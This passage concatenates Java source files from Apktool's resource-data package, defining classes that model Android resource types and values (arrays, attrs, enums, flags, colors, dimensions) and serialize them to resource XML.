import java.util.*;

public final class ResTypeSpec {

    public static final String RES_TYPE_NAME_ARRAY = "array";
    public static final String RES_TYPE_NAME_PLURALS = "plurals";
    public static final String RES_TYPE_NAME_STYLES = "style";
    public static final String RES_TYPE_NAME_ATTR = "attr";

    private final String mName;
    private final Map<String, ResResSpec> mResSpecs = new LinkedHashMap<>();

    private final ResTable mResTable;
    private final ResPackage mPackage;

    private final int mId;
    private final int mEntryCount;

    public ResTypeSpec(String name, ResTable resTable, ResPackage package_, int id, int entryCount) {
        this.mName = name;
        this.mResTable = resTable;
        this.mPackage = package_;
        this.mId = id;
        this.mEntryCount = entryCount;
    }

    public String getName() {
        return mName;
    }

    public int getId() {
        return mId;
    }

    public boolean isString() {
        return mName.equalsIgnoreCase("string");
    }

    public ResResSpec getResSpec(String name) throws AndrolibException {
        ResResSpec spec = getResSpecUnsafe(name);
        if (spec == null) {
            throw new UndefinedResObjectException(String.format("resource spec: %s/%s", getName(), name));
        }
        return spec;
    }

    public ResResSpec getResSpecUnsafe(String name) {
        return mResSpecs.get(name);
    }

    public void removeResSpec(ResResSpec spec) {
        mResSpecs.remove(spec.getName());
    }

    public void addResSpec(ResResSpec spec) throws AndrolibException {
        if (mResSpecs.put(spec.getName(), spec) != null) {
            throw new AndrolibException(String.format("Multiple res specs: %s/%s", getName(), spec.getName()));
        }
    }

    @Override
    public String toString() {
        return mName;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/ResUnknownFiles.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data;

import java.util.LinkedHashMap;
import java.util.Map;

public class ResUnknownFiles {

    private final Map<String, String> mUnknownFiles = new LinkedHashMap<>();

    public void addUnknownFileInfo(String file, String value) {
        mUnknownFiles.put(file, value);
    }

    public Map<String, String> getUnknownFiles() {
        return mUnknownFiles;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/ResValuesFile.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data;

import java.util.LinkedHashSet;
import java.util.Objects;
import java.util.Set;

public class ResValuesFile {
    private final ResPackage mPackage;
    private final ResTypeSpec mType;
    private final ResType mConfig;
    private final Set<ResResource> mResources = new LinkedHashSet<>();

    public ResValuesFile(ResPackage pkg, ResTypeSpec type, ResType config) {
        this.mPackage = pkg;
        this.mType = type;
        this.mConfig = config;
    }

    public String getPath() {
        return "values" + mConfig.getFlags().getQualifiers() + "/"
                + mType.getName() + (mType.getName().endsWith("s") ? "" : "s")
                + ".xml";
    }

    public Set<ResResource> listResources() {
        return mResources;
    }

    public ResTypeSpec getType() {
        return mType;
    }

    public boolean isSynthesized(ResResource res) {
        return mPackage.isSynthesized(res.getResSpec().getId());
    }

    public void addResource(ResResource res) {
        mResources.add(res);
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == null) {
            return false;
        }
        if (getClass() != obj.getClass()) {
            return false;
        }
        final ResValuesFile other = (ResValuesFile) obj;
        if (!Objects.equals(this.mType, other.mType)) {
            return false;
        }
        return Objects.equals(this.mConfig, other.mConfig);
    }

    @Override
    public int hashCode() {
        int hash = 17;
        hash = 31 * hash + (this.mType != null ? this.mType.hashCode() : 0);
        hash = 31 * hash + (this.mConfig != null ? this.mConfig.hashCode() : 0);
        return hash;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResArrayValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import brut.androlib.AndrolibException;
import brut.androlib.res.data.ResResource;
import brut.androlib.res.xml.ResValuesXmlSerializable;
import brut.util.Duo;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.util.Arrays;

public class ResArrayValue extends ResBagValue implements
        ResValuesXmlSerializable {

    ResArrayValue(ResReferenceValue parent, Duo<Integer, ResScalarValue>[] items) {
        super(parent);

        mItems = new ResScalarValue[items.length];
        for (int i = 0; i < items.length; i++) {
            mItems[i] = items[i].m2;
        }
    }

    public ResArrayValue(ResReferenceValue parent, ResScalarValue[] items) {
        super(parent);
        mItems = items;
    }

    @Override
    public void serializeToResValuesXml(XmlSerializer serializer,
                                        ResResource res) throws IOException, AndrolibException {
        String type = getType();
        type = (type == null ? "" : type + "-") + "array";
        serializer.startTag(null, type);
        serializer.attribute(null, "name", res.getResSpec().getName());

        // lets check if we need to add formatted="false" to this array
        for (ResScalarValue item : mItems) {
            if (item.hasMultipleNonPositionalSubstitutions()) {
                serializer.attribute(null, "formatted", "false");
                break;
            }
        }

        // add <item>'s
        for (ResScalarValue mItem : mItems) {
            serializer.startTag(null, "item");
            serializer.text(mItem.encodeAsResXmlNonEscapedItemValue());
            serializer.endTag(null, "item");
        }
        serializer.endTag(null, type);
    }

    public String getType() throws AndrolibException {
        if (mItems.length == 0) {
            return null;
        }
        String type = mItems[0].getType();
        for (ResScalarValue mItem : mItems) {
            if (mItem.encodeAsResXmlItemValue().startsWith("@string")) {
                return "string";
            } else if (mItem.encodeAsResXmlItemValue().startsWith("@drawable")) {
                return null;
            } else if (mItem.encodeAsResXmlItemValue().startsWith("@integer")) {
                return "integer";
            } else if (!"string".equals(type) && !"integer".equals(type)) {
                return null;
            } else if (!type.equals(mItem.getType())) {
                return null;
            }
        }
        if (!Arrays.asList(AllowedArrayTypes).contains(type)) {
            return "string";
        }
        return type;
    }

    private final ResScalarValue[] mItems;
    private final String[] AllowedArrayTypes = {"string", "integer"};

    public static final int BAG_KEY_ARRAY_START = 0x02000000;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResAttr.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import brut.androlib.AndrolibException;
import brut.androlib.res.data.ResPackage;
import brut.androlib.res.data.ResResource;
import brut.androlib.res.xml.ResValuesXmlSerializable;
import brut.util.Duo;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;

public class ResAttr extends ResBagValue implements ResValuesXmlSerializable {
    ResAttr(ResReferenceValue parentVal, int type, Integer min, Integer max,
            Boolean l10n) {
        super(parentVal);
        mType = type;
        mMin = min;
        mMax = max;
        mL10n = l10n;
    }

    public String convertToResXmlFormat(ResScalarValue value) throws AndrolibException {
        return null;
    }

    @Override
    public void serializeToResValuesXml(XmlSerializer serializer, ResResource res)
        throws IOException, AndrolibException {
        String type = getTypeAsString();

        serializer.startTag(null, "attr");
        serializer.attribute(null, "name", res.getResSpec().getName());
        if (type != null) {
            serializer.attribute(null, "format", type);
        }
        if (mMin != null) {
            serializer.attribute(null, "min", mMin.toString());
        }
        if (mMax != null) {
            serializer.attribute(null, "max", mMax.toString());
        }
        if (mL10n != null && mL10n) {
            serializer.attribute(null, "localization", "suggested");
        }
        serializeBody(serializer, res);
        serializer.endTag(null, "attr");
    }

    public static ResAttr factory(ResReferenceValue parent,
                                  Duo<Integer, ResScalarValue>[] items, ResValueFactory factory,
                                  ResPackage pkg) throws AndrolibException {

        int type = ((ResIntValue) items[0].m2).getValue();
        int scalarType = type & 0xffff;
        Integer min = null, max = null;
        Boolean l10n = null;
        int i;
        for (i = 1; i < items.length; i++) {
            switch (items[i].m1) {
                case BAG_KEY_ATTR_MIN:
                    min = ((ResIntValue) items[i].m2).getValue();
                    continue;
                case BAG_KEY_ATTR_MAX:
                    max = ((ResIntValue) items[i].m2).getValue();
                    continue;
                case BAG_KEY_ATTR_L10N:
                    l10n = ((ResIntValue) items[i].m2).getValue() != 0;
                    continue;
            }
            break;
        }

        if (i == items.length) {
            return new ResAttr(parent, scalarType, min, max, l10n);
        }
        Duo<ResReferenceValue, ResIntValue>[] attrItems = new Duo[items.length - i];
        int j = 0;
        for (; i < items.length; i++) {
            int resId = items[i].m1;
            pkg.addSynthesizedRes(resId);
            attrItems[j++] = new Duo<>(factory.newReference(resId, null), (ResIntValue) items[i].m2);
        }
        switch (type & 0xff0000) {
            case TYPE_ENUM:
                return new ResEnumAttr(parent, scalarType, min, max, l10n, attrItems);
            case TYPE_FLAGS:
                return new ResFlagsAttr(parent, scalarType, min, max, l10n, attrItems);
        }

        throw new AndrolibException("Could not decode attr value");
    }

    protected void serializeBody(XmlSerializer serializer, ResResource res) throws AndrolibException, IOException {
    }

    protected String getTypeAsString() {
        String s = "";
        if ((mType & TYPE_REFERENCE) != 0) {
            s += "|reference";
        }
        if ((mType & TYPE_STRING) != 0) {
            s += "|string";
        }
        if ((mType & TYPE_INT) != 0) {
            s += "|integer";
        }
        if ((mType & TYPE_BOOL) != 0) {
            s += "|boolean";
        }
        if ((mType & TYPE_COLOR) != 0) {
            s += "|color";
        }
        if ((mType & TYPE_FLOAT) != 0) {
            s += "|float";
        }
        if ((mType & TYPE_DIMEN) != 0) {
            s += "|dimension";
        }
        if ((mType & TYPE_FRACTION) != 0) {
            s += "|fraction";
        }
        if (s.isEmpty()) {
            return null;
        }
        return s.substring(1);
    }

    private final int mType;
    private final Integer mMin;
    private final Integer mMax;
    private final Boolean mL10n;

    public static final int BAG_KEY_ATTR_TYPE = 0x01000000;
    private static final int BAG_KEY_ATTR_MIN = 0x01000001;
    private static final int BAG_KEY_ATTR_MAX = 0x01000002;
    private static final int BAG_KEY_ATTR_L10N = 0x01000003;

    private final static int TYPE_REFERENCE = 0x01;
    private final static int TYPE_STRING = 0x02;
    private final static int TYPE_INT = 0x04;
    private final static int TYPE_BOOL = 0x08;
    private final static int TYPE_COLOR = 0x10;
    private final static int TYPE_FLOAT = 0x20;
    private final static int TYPE_DIMEN = 0x40;
    private final static int TYPE_FRACTION = 0x80;
    private final static int TYPE_ANY_STRING = 0xee;

    private static final int TYPE_ENUM = 0x00010000;
    private static final int TYPE_FLAGS = 0x00020000;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResBagValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import brut.androlib.AndrolibException;
import brut.androlib.res.data.ResResource;
import brut.androlib.res.xml.ResValuesXmlSerializable;
import brut.util.Duo;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;

public class ResBagValue extends ResValue implements ResValuesXmlSerializable {
    protected final ResReferenceValue mParent;

    public ResBagValue(ResReferenceValue parent) {
        this.mParent = parent;
    }

    @Override
    public void serializeToResValuesXml(XmlSerializer serializer,
                                        ResResource res) throws IOException, AndrolibException {
        String type = res.getResSpec().getType().getName();
        if ("style".equals(type)) {
            new ResStyleValue(mParent, new Duo[0], null)
                    .serializeToResValuesXml(serializer, res);
            return;
        }
        if ("array".equals(type)) {
            new ResArrayValue(mParent, new Duo[0]).serializeToResValuesXml(
                    serializer, res);
            return;
        }
        if ("plurals".equals(type)) {
            new ResPluralsValue(mParent, new Duo[0]).serializeToResValuesXml(
                    serializer, res);
            return;
        }

        serializer.startTag(null, "item");
        serializer.attribute(null, "type", type);
        serializer.attribute(null, "name", res.getResSpec().getName());
        serializer.endTag(null, "item");
    }

    public ResReferenceValue getParent() {
        return mParent;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResBoolValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

public class ResBoolValue extends ResScalarValue {
    private final boolean mValue;

    public ResBoolValue(boolean value, int rawIntValue, String rawValue) {
        super("bool", rawIntValue, rawValue);
        this.mValue = value;
    }

    public boolean getValue() {
        return mValue;
    }

    @Override
    protected String encodeAsResXml() {
        return mValue ? "true" : "false";
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResColorValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

public class ResColorValue extends ResIntValue {
    public ResColorValue(int value, String rawValue) {
        super(value, rawValue, "color");
    }

    @Override
    protected String encodeAsResXml() {
        return String.format("#%08x", mValue);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResDimenValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import android.util.TypedValue;
import brut.androlib.AndrolibException;

public class ResDimenValue extends ResIntValue {
    public ResDimenValue(int value, String rawValue) {
        super(value, rawValue, "dimen");
    }

    @Override
    protected String encodeAsResXml() throws AndrolibException {
        return TypedValue.coerceToString(TypedValue.TYPE_DIMENSION, mValue);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResEmptyValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import brut.androlib.AndrolibException;

public class ResEmptyValue extends ResScalarValue {
    protected final int mValue;
    protected int type;

    public ResEmptyValue(int value, String rawValue, int type) {
        this(value, rawValue, "integer");
        this.type = type;
    }

    public ResEmptyValue(int value, String rawValue, String type) {
        super(type, value, rawValue);
        if (value != 1)
            throw new UnsupportedOperationException();
        this.mValue = value;
    }

    public int getValue() {
        return mValue;
    }

    @Override
    protected String encodeAsResXml() throws AndrolibException {
        return "@empty";
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResEnumAttr.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import brut.androlib.AndrolibException;
import brut.androlib.res.data.ResResSpec;
import brut.androlib.res.data.ResResource;
import brut.util.Duo;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class ResEnumAttr extends ResAttr {
    ResEnumAttr(ResReferenceValue parent, int type, Integer min, Integer max,
                Boolean l10n, Duo<ResReferenceValue, ResIntValue>[] items) {
        super(parent, type, min, max, l10n);
        mItems = items;
    }

    @Override
    public String convertToResXmlFormat(ResScalarValue value)
            throws AndrolibException {
        if (value instanceof ResIntValue) {
            String ret = decodeValue(((ResIntValue) value).getValue());
            if (ret != null) {
                return ret;
            }
        }
        return super.convertToResXmlFormat(value);
    }

    @Override
    protected void serializeBody(XmlSerializer serializer, ResResource res)
            throws AndrolibException, IOException {
        for (Duo<ResReferenceValue, ResIntValue> duo : mItems) {
            int intVal = duo.m2.getValue();
            ResResSpec m1Referent = duo.m1.getReferent();

            serializer.startTag(null, "enum");
            serializer.attribute(null, "name",
                    m1Referent != null ? m1Referent.getName() : "@null"
            );
            serializer.attribute(null, "value", String.valueOf(intVal));
            serializer.endTag(null, "enum");
        }
    }

    private String decodeValue(int value) throws AndrolibException {
        String value2 = mItemsCache.get(value);
        if (value2 == null) {
            ResReferenceValue ref = null;
            for (Duo<ResReferenceValue, ResIntValue> duo : mItems) {
                if (duo.m2.getValue() == value) {
                    ref = duo.m1;
                    break;
                }
            }
            if (ref != null) {
                value2 = ref.getReferent().getName();
                mItemsCache.put(value, value2);
            }
        }
        return value2;
    }

    private final Duo<ResReferenceValue, ResIntValue>[] mItems;
    private final Map<Integer, String> mItemsCache = new HashMap<>();
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResFileValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import brut.androlib.AndrolibException;

public class ResFileValue extends ResIntBasedValue {
    private final String mPath;

    public ResFileValue(String path, int rawIntValue) {
        super(rawIntValue);
        this.mPath = path;
    }

    public String getStrippedPath() throws AndrolibException {
        if (mPath.startsWith("res/")) {
            return mPath.substring(4);
        }
        if (mPath.startsWith("r/") || mPath.startsWith("R/")) {
            return mPath.substring(2);
        }
        throw new AndrolibException("File path does not start with \"res/\" or \"r/\": " + mPath);
    }

    @Override
    public String toString() {
        return mPath;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResFlagsAttr.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import brut.androlib.AndrolibException;
import brut.androlib.res.data.ResResource;
import brut.util.Duo;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.util.Arrays;

public class ResFlagsAttr extends ResAttr {
    ResFlagsAttr(ResReferenceValue parent, int type, Integer min, Integer max,
                 Boolean l10n, Duo<ResReferenceValue, ResIntValue>[] items) {
        super(parent, type, min, max, l10n);

        mItems = new FlagItem[items.length];
        for (int i = 0; i < items.length; i++) {
            mItems[i] = new FlagItem(items[i].m1, items[i].m2.getValue());
        }
    }

    @Override
    public String convertToResXmlFormat(ResScalarValue value)
            throws AndrolibException {
        if(value instanceof ResReferenceValue) {
            return value.encodeAsResXml();
        }
        if (!(value instanceof ResIntValue)) {
            return super.convertToResXmlFormat(value);
        }
        loadFlags();
        int intVal = ((ResIntValue) value).getValue();

        if (intVal == 0) {
            return renderFlags(mZeroFlags);
        }

        FlagItem[] flagItems = new FlagItem[mFlags.length];
        int[] flags = new int[mFlags.length];
        int flagsCount = 0;
        for (FlagItem flagItem : mFlags) {
            int flag = flagItem.flag;

            if ((intVal & flag) != flag) {
                continue;
            }

            if (!isSubpartOf(flag, flags)) {
                flags[flagsCount] = flag;
                flagItems[flagsCount++] = flagItem;
            }
        }
        return renderFlags(Arrays.copyOf(flagItems, flagsCount));
    }

    @Override
    protected void serializeBody(XmlSerializer serializer, ResResource res)
            throws AndrolibException, IOException {
        for (FlagItem item : mItems) {
            serializer.startTag(null, "flag");
            serializer.attribute(null, "name", item.getValue());
            serializer.attribute(null, "value",
                String.format("0x%08x", item.flag));
            serializer.endTag(null, "flag");
        }
    }

    private boolean isSubpartOf(int flag, int[] flags) {
        for (int j : flags) {
            if ((j & flag) == flag) {
                return true;
            }
        }
        return false;
    }

    private String renderFlags(FlagItem[] flags) throws AndrolibException {
        StringBuilder ret = new StringBuilder();
        for (FlagItem flag : flags) {
            ret.append("|").append(flag.getValue());
        }
        if (ret.length() == 0) {
            return ret.toString();
        }
        return ret.substring(1);
    }

    private void loadFlags() {
        if (mFlags != null) {
            return;
        }

        FlagItem[] zeroFlags = new FlagItem[mItems.length];
        int zeroFlagsCount = 0;
        FlagItem[] flags = new FlagItem[mItems.length];
        int flagsCount = 0;

        for (FlagItem item : mItems) {
            if (item.flag == 0) {
                zeroFlags[zeroFlagsCount++] = item;
            } else {
                flags[flagsCount++] = item;
            }
        }

        mZeroFlags = Arrays.copyOf(zeroFlags, zeroFlagsCount);
        mFlags = Arrays.copyOf(flags, flagsCount);

        Arrays.sort(mFlags, (o1, o2) -> Integer.compare(Integer.bitCount(o2.flag), Integer.bitCount(o1.flag)));
    }

    private final FlagItem[] mItems;

    private FlagItem[] mZeroFlags;
    private FlagItem[] mFlags;

    private static class FlagItem {
        public final ResReferenceValue ref;
        public final int flag;
        public String value;

        public FlagItem(ResReferenceValue ref, int flag) {
            this.ref = ref;
            this.flag = flag;
        }

        public String getValue() throws AndrolibException {
            if (value == null) {
                if (ref.referentIsNull()) {
                    return "@null";
                }
                value = ref.getReferent().getName();
            }
            return value;
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResFloatValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

public class ResFloatValue extends ResScalarValue {
    private final float mValue;

    public ResFloatValue(float value, int rawIntValue, String rawValue) {
        super("float", rawIntValue, rawValue);
        this.mValue = value;
    }

    public float getValue() {
        return mValue;
    }

    @Override
    protected String encodeAsResXml() {
        return String.valueOf(mValue);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResFractionValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import android.util.TypedValue;
import brut.androlib.AndrolibException;

public class ResFractionValue extends ResIntValue {
    public ResFractionValue(int value, String rawValue) {
        super(value, rawValue, "fraction");
    }

    @Override
    protected String encodeAsResXml() throws AndrolibException {
        return TypedValue.coerceToString(TypedValue.TYPE_FRACTION, mValue);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResIdValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import brut.androlib.res.data.ResResource;
import brut.androlib.res.xml.ResValuesXmlSerializable;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;

public class ResIdValue extends ResValue implements ResValuesXmlSerializable {
    @Override
    public void serializeToResValuesXml(XmlSerializer serializer, ResResource res) throws IOException {
        serializer.startTag(null, "item");
        serializer.attribute(null, "type", res.getResSpec().getType().getName());
        serializer.attribute(null, "name", res.getResSpec().getName());
        serializer.endTag(null, "item");
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResIntBasedValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

public class ResIntBasedValue extends ResValue {
    private final int mRawIntValue;

    protected ResIntBasedValue(int rawIntValue) {
        mRawIntValue = rawIntValue;
    }

    public int getRawIntValue() {
        return mRawIntValue;
    }
}

```

